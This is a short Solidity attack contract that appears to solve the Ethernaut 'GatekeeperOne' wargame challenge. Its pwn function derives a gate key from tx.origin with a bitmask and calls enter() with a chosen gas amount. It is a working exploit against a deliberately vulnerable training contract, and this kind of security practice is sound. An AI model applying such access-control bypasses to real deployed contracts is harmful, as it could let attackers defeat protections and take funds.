pragma solidity ^0.8.20;

import {console} from "forge-std/Script.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne private externalContract;

    constructor(address _externalContract) {
        externalContract = IGatekeeperOne(_externalContract);
    }

    function pwn(uint256 gasAmount) external {
        bytes8 gateKey = bytes8(uint64(uint160(address(tx.origin)))) & 0xFFFFFFF00000FFFF;

        (bool success,) =
            address(externalContract).call{gas: gasAmount}(abi.encodeWithSignature("enter(bytes8)", gateKey));

        require(success, "Call failed");
    }
}
